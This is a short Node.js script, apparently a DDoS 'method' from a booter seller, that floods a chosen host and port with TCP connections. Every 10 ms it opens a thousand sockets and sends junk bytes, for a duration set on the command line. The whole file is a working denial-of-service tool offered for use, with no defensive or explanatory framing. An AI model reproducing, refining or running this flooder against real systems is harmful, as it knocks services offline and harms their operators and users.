//Method By STEVEN•STORE🕊🪽
const net = require('net');

if (process.argv.length < 5) {
  console.log('Usage: node tcp.js <target> <port> <duration>');
  process.exit();
}

const target = process.argv[2];
const port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]) * 1000;
const endTime = Date.now() + duration;

console.log(`[TCP] Attacking ${target}:${port} for ${duration / 1000} seconds...🕊🪽`);

function sendPacket() {
  const client = new net.Socket();
  client.connect(port, target, () => {
    client.write(Buffer.alloc(1024, '0'));
    client.destroy();
  });

  client.on('error', () => {
    client.destroy();
  });
}

const interval = setInterval(() => {
  if (Date.now() > endTime) {
    clearInterval(interval);
    console.log('[TCP] Attack ended🕊🪽.');
    process.exit();
  }

  for (let i = 0; i < 1000; i++) {
    sendPacket();
  }
}, 10);
